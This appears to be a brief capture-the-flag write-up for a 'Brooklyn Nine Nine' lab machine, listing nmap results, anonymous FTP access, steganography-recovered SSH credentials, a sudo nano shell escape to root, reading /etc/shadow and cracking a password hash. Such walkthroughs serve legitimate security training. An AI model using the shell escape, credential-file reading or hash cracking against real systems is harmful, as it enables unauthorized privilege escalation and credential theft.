# Brooklyn Nine Nine CTF

## nmap
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running: Crestron 2-Series
OS CPE: cpe:/o:crestron:2_series
OS details: Crestron XPanel control system
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enum
- Login with anonymous accesss to ftp
- Retrieve note_to_jake.txt which tells Jake that his password is weak (ssh I assume)
- Run stegseek on the image from the website, retrieve holts ssh credentials `fluffydog12@ninenine`

## Foothold
- Login as holt with the password found on ssh
- Find that he can run nano with sudo
- GTFO bin it:
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

## Finding jakes password by reading /etc/shadow
- Cracking the hash with johntheripper `987654321`